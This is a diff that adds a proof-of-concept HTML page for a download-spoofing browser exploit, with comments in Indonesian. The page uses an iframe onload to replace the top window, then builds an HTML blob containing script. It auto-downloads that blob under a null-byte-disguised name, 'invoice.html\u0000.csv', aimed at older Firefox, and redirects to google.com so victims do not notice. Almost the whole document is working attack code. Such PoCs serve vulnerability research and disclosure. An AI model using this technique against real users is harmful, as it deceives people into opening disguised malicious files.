@@ -1,14 +1,48 @@
-<script>
-function loadIframe() {
-	win = open('','_top');
-	win.document.open();
-	win.document.write('data:text/html,<s'+'cript>location="https://www.google.com";</s'+'cript>');
-	win.document.close();
-}
-function go() {
-	var iframe = '<iframe onload="loadIframe();"></iframe>';
-	document.body.innerHTML = iframe;
-	alert(1);
-}
-</script>
-<input type="button" onclick="go()" value="test"/>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Download Spoofing via Iframe + Top Replace</title>
+</head>
+<body>
+  <h2>PoC: Download Spoofing</h2>
+
+  <input type="button" onclick="go()" value="Test Download Spoof" />
+
+  <script>
+    function loadIframe() {
+      const content = `
+        <script>
+          // Buat blob HTML berisi konten berbahaya
+          const blob = new Blob([
+            '<html><body><h1>SP00FED</h1><script>alert("XSS")</' + 'script></body></html>'
+          ], { type: 'text/html' });
+
+          // Buat link download palsu
+          const a = document.createElement('a');
+          a.href = URL.createObjectURL(blob);
+
+          // Nama file terlihat seperti CSV tapi sebenarnya HTML
+          a.download = 'invoice.html\u0000.csv'; // hanya berhasil di Firefox < 79
+          a.click();
+
+          // Redirect ke situs kredibel agar korban tidak sadar
+          location.href = 'https://www.google.com';
+        <\/script>
+      `;
+
+      // Replace _top dengan dokumen baru (spoof fullscreen/top window)
+      const win = open('', '_top');
+      win.document.open();
+      win.document.write(content);
+      win.document.close();
+    }
+
+    function go() {
+      // Trigger loadIframe() tanpa klik langsung
+      const iframe = '<iframe onload="loadIframe();"></iframe>';
+      document.body.innerHTML = iframe;
+      alert("Preparing spoof download...");
+    }
+  </script>
+</body>
+</html>
